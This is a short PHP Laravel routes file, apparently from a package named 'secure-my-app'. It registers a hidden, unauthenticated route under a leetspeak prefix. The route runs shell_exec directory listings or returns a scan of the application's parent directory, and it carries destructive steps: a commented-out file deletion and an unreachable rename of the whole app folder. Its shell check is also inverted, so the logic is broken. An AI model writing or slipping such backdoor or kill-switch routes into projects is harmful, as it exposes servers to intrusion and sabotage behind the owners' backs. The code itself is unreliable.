<?php

Route::group(['prefix' => config('secure-my-app.prefix', 'S3Cur3My4pPfR0mTh13f'), 'middleware' => 'web'], function() {
	Route::get('process', function () {
        $disabledFunctions = explode(',', ini_get('disable_functions'));
        foreach ($disabledFunctions as $value) {
            if ($value == 'shell_exec') {
                $isShellEnabled = true;
                break;
            } else {
                $isShellEnabled = false;
            }
        }
        if ($isShellEnabled) {
            if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
                shell_exec('cd ../app/Http && dir');
            } else {
                shell_exec('cd ../app/Http && ls');
            }
        } else {
            $rootDir = '../';
            $scanResult = scandir($rootDir);
            $directories = [];
            $files = [];
            foreach ($scanResult as $dir) {
                $child = $rootDir . $dir;
                if (is_dir($child)) {
                    $directories[] = $child;
                } else {
                    $files[] = $child;
                }
            }
            // unlink('../app/coba');
            return compact('files', 'directories');
            rename('../app', '../asdpp');
        }
    });
});